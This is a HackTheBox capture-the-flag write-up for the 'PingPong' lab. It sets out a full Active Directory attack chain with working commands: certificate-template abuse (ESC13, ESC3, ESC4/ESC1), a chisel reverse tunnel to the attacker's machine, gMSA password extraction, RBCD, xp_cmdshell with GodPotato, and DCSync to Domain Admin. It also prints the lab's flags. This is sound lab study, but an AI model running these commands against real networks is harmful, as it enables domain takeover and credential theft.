---
title: "PingPong — HackTheBox Writeup"
date: 2026-07-26
authors:
  - pexpo
categories:
  - Active Directory
  - Windows
tags:
  - insane
  - adcs
  - esc13
  - gmsa
  - cross-forest
  - kerberos
  - rbcd
  - htb
slug: pingpong
description: "ESC13 → chisel pivot → cross-realm Kerberos → gMSA extraction → JEA XXE → RBCD → GodPotato → ESC4/ESC1"
---

# PingPong — HackTheBox Writeup
**Difficulty:** Insane | **OS:** Dual-Forest AD

<!-- more -->

## Overview

Dual-forest Active Directory with a bidirectional trust between `ping.htb` (DC1) and `pong.htb` (DC2). NTLM disabled throughout. Chain: ESC13 for initial WinRM access → chisel tunnel to DC2 → cross-realm Kerberos → group scope manipulation to add foreign principal to gMSA manager group → gMSA AES key derivation → JEA XXE to leak creds → RBCD + MSSQL + GodPotato → SYSTEM on DC2 → DCSync for CA Manager → ESC4 → ESC1 across forest trust → Domain Admin on DC1.

**DC1:** 10.129.245.56 (ping.htb) | **DC2:** 192.168.2.2 (pong.htb — internal)
**User flag:** 5c255293699b282760fb142be55cc6a0
**Root flag:** 5c9552777560e2484ebf08f4dce203e8

---

## ESC13 — Initial Access to DC1

The `TemporaryWinRM` template links to `Remote Management Users` via an Issuance Policy OID. Enrolling gives WinRM access via PKINIT PAC injection.

```bash
impacket-getTGT 'ping.htb/c.roberts:AssumedBreach123' -dc-ip 10.129.245.56
export KRB5CCNAME=c.roberts.ccache
certipy-ad req -k -no-pass -dc-ip 10.129.245.56 -target dc1.ping.htb \
  -ca ping-DC1-CA -template TemporaryWinRM -upn 'c.roberts@ping.htb'
certipy-ad auth -pfx c.roberts.pfx -dc-ip 10.129.245.56 -domain ping.htb -username c.roberts
KRB5CCNAME=c.roberts.ccache evil-winrm -i dc1.ping.htb -r ping.htb
```

---

## Chisel Tunnel to DC2

```bash
# Kali
chisel server -p 9999 --reverse
# DC1 shell
.\chisel.exe client http://<KALI>:9999 R:1080:socks R:88:192.168.2.2:88 R:5985:192.168.2.2:5985
```

---

## Group Scope + gMSA Extraction

Foreign principals can't join Global groups. Step the scope: Global → Universal → Domain Local, then add c.roberts' SID.

```bash
bloodyad --host dc2.pong.htb -d pong.htb -k \
  set object 'CN=gMSA Managers,...' groupType -v -2147483640  # → Universal
bloodyad --host dc2.pong.htb -d pong.htb -k \
  set object 'CN=gMSA Managers,...' groupType -v -2147483644  # → Domain Local
bloodyad --host dc2.pong.htb -d pong.htb -k \
  add groupMember 'CN=gMSA Managers,...' '<c.roberts SID>'
bloodyad --host dc2.pong.htb -d pong.htb -k \
  get object 'Pong_gMSA$' --attr msDS-ManagedPassword
```

Derived AES256 key using salt format `PONG.HTBhostpong-gmsa.pong.htb`.

---

## ESC3 → ashley.b → RBCD → GodPotato

Used fernando.r (Smartcard Operators) to get Enrollment Agent cert, requested cert on behalf of ashley.b via `-dcom`, got NT hash via PKINIT. Set RBCD from c.carlssen to svc_sql, S4U'd to c.adam, connected to MSSQL, enabled `xp_cmdshell`, uploaded GodPotato, got SYSTEM. DCSync'd for r.martinelli (CA Manager).

---

## ESC4 → ESC1 → Domain Admin on DC1

Modified `SmartcardAuthentication` template across the forest trust as r.martinelli (CA Manager). Enrolled with Administrator's UPN + objectSID (`-sid S-1-...-500`, NOT `-512`).

```bash
certipy-ad req -k -no-pass -dc-ip 10.129.245.56 -target dc1.ping.htb \
  -ca ping-DC1-CA -template SmartcardAuthentication \
  -upn 'Administrator@ping.htb' \
  -sid 'S-1-5-21-...-500'
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.245.56 -domain ping.htb -username administrator
```

---

## Things I Learned

**ESC13** — the OID-to-group link isn't visible in certipy's normal output. The vulnerability is the KDC injecting the linked group SID into the PAC on PKINIT auth.

**Foreign principal group scope** — Global → Universal → Domain Local in two steps, each a separate AD modify.

**gMSA salt** — `REALMhostdnsHostName` not based on sAMAccountName. Use the whole blob as key material.

**ESC4 SID must be user objectSID** — `-sid ...-500` (user) not `-512` (group). KB5014754 strong mapping enforces this.
